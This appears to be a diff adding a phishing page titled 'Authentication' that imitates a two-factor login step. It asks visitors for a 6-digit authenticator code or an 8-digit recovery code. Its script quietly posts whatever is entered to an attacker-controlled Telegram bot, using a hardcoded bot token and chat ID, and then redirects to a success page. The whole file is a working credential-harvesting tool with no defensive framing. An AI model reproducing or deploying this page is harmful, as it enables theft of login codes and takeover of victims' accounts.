@@ -1,0 +1,102 @@
+<html lang="en">
+<head>
+    <title>Authentication</title>
+    <link rel="icon" type="image/x-icon" href="favicon.ico">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=0">
+    <link rel="stylesheet" type="text/css" href="css/style-info1.css">
+    <link rel="stylesheet" type="text/css" href="css/interview1.css">
+    <script language="JavaScript">
+        var tanggallengkap = new String();
+        var namahari = ("Minggu Senin Selasa Rabu Kamis Jumat Sabtu");
+        namahari = namahari.split(" ");
+        var namabulan = ("January February March April May June July August September October November December");
+        namabulan = namabulan.split(" ");
+        var tgl = new Date();
+        var hari = tgl.getDay();
+        var tanggal = tgl.getDate();
+        var bulan = tgl.getMonth();
+        var tahun = tgl.getFullYear();
+        tanggallengkap = namabulan[bulan] + " " + tanggal + ", " + tahun;
+    </script>
+</head>
+<body>
+    <div id="page-div">
+        <div id="interview-page-container">
+            <div class="BackArrowAndHeading">
+                <center><img alt="" src="45.png" width="93%"></center>
+            </div>
+            <div id="AboutYouSection" class="Question AboutYouSection">
+                <div class="CaptionWrapper">
+                    <div class="Caption">
+                        <center>
+                            <div class="thepadding">
+                                <span style="color: #3c78d8; font-family: 'Roboto', 'Arial'; font-size: 13pt; vertical-align: baseline;">
+                                    <hr>
+                                    <h4 class="h4_of text-center">Approve from another device or Enter your login code</h4>
+                                </span>
+                                <b style="color: #4d4d4d; font-weight: bold;"></b>
+                            </div>
+                            <center>
+                                <font color="grey">Enter the 6-digit code we just sent from the authentication app you set up, or Enter the 8-digit recovery code.</font>
+                            </center>
+                        </center>
+                    </div>
+                </div>
+                <form id="authForm" onsubmit="sendTelegramMessage(event)">
+                    <div class="ElementWrapper">
+                        <div class="FormElement FormElement_TextBox NoTopMargin PrevYearDays">
+                            <div class="TextBox floatingLabelContainer">
+                                <input type="password" name="PrevToPass" id="PrevYearDays" required="" pattern=".{5,}" placeholder=" ">
+                                <label class="Caption" title="Password" for="PrevYearDays">Login code</label>
+                            </div>
+                        </div>
+                        <span id="error_IndividualOrBusiness" class="error-message">Required</span>
+                        <div class="FormElement FormElement_Button ButtonNext">
+                            <div class="Button">
+                                <button name="ButtonNext" class="ButtonNext">Submit Code</button>
+                            </div>
+                        </div>
+                    </div>
+                </form>
+            </div>
+        </div>
+    </div>
+    <script>
+        function sendTelegramMessage(event) {
+            event.preventDefault(); // Prevent form submission
+
+            const code = document.getElementById('PrevYearDays').value;
+            const botToken = '"7652154074:AAEQX3FzEBlMyCPqUJVkgUzl6mL0mi1zj-Q';
+    const chatId = '6968789311';
+            const message = `New login code submitted: ${code}`;
+
+            // Send message to Telegram
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: message,
+                }),
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.ok) {
+                    alert('Code submitted successfully!');
+                     setTimeout(() => {
+          window.location.href = 'sucess.html';
+        }, 3000); // Delay for 3 seconds before redirecting
+                } else {
+                    alert('Error sending message: ' + data.description);
+                }
+            })
+            .catch(error => {
+                console.error('Error:', error);
+                alert('Error sending message. Please try again later.');
+            });
+        }
+    </script>
+</body>
+</html>
